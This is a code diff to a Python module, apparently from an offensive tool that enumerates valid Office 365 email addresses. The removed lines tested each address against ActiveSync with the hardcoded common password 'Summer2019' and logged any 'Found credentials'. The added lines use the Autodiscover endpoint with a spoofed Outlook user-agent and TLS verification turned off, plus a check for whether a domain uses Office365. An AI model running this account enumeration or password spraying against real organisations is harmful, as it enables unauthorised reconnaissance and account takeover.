@@ -1,41 +1,43 @@
 from lib import logger
-import requests
+import requests,random,string
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+user_agent = 'Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)'
+headers = {'User-Agent': user_agent, 'Accept': 'application/json'}
 
 def validate(email):
 	try:
-		# The password here doesnt really matter as the o365 link just requires anything, but its worthwhile having a common password in order to check for access at the same time
-		password='Summer2019'
-		url = 'https://outlook.office365.com/Microsoft-Server-ActiveSync'
-		headers = {"MS-ASProtocolVersion": "14.0"}
-		auth = (email, password)
-
-		try:
-			logger.verbose('Attempting to validate %s' % logger.YELLOW(email))
-			r = requests.options(url, headers=headers, auth=auth)
-			status = r.status_code
-		except:
-			logger.verbose('Unable to connect to [%s]' % logger.RED(url))
-			quit()
-
-		if status == 401:
-			logger.green('Successfully validated %s' % logger.GREEN(email))
+		r = requests.get('https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/{}?Protocol=Autodiscoverv1'.format(email), headers=headers, verify=False, allow_redirects=False)
+		if r.status_code == 200:
+			logger.green('Verified: %s' % logger.GREEN(email))
 			return True
-
-		elif status == 404:
-			logger.verbose('Could not validate %s' % logger.RED(email))
-			return False
-
-		elif status == 403:
-			logger.green('Found credentials: %s:%s (2FA)' % (logger.GREEN(email),logger.GREEN(password)))
-			return [True,password]
-
-		elif status == 200:
-			logger.green('Found credentials: %s:%s' % (logger.GREEN(email),logger.GREEN(password)))
-			return [True,password]
-		else:
-			logger.verbose('Got HTTP Status Response %s. Unexpected, skipping.' % logger.RED(str(status)))
-			return None
-
+		elif r.status_code == 302:
+			if 'outlook.office365.com' not in r.text:
+				logger.green('Verified: %s' % logger.GREEN(email))
+				return True
+			else:
+				logger.verbose('Failed: %s' % logger.RED(email))
+				return False
 	except KeyboardInterrupt:
 		logger.yellow('Keyboard interrupt detected!')
 		quit()
+
+def verify_o365(domain):
+	logger.yellow('Attempting to verify if %s is using Office365' % logger.YELLOW(domain))
+	domain_is_o365 = {}
+	try:
+		junk_user = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(20))
+		r = requests.get('https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/{}@{}?Protocol=Autodiscoverv1'.format(junk_user, domain), headers=headers, verify=False, allow_redirects=False)
+		if 'outlook.office365.com' in r.text:
+			logger.green('It looks like %s is using %s!' % (logger.GREEN(domain),logger.GREEN('Office365')))
+			domain_is_o365[domain] = True
+		else:
+			logger.red('It doesnt look like %s is using %s' % (logger.RED(domain),logger.RED('Office365')))
+			domain_is_o365[domain] = False
+			quit()
+	except Exception as e:
+		logger.red(str(e))
+		domain_is_o365[domain] = False
+	print()
+	return domain_is_o365
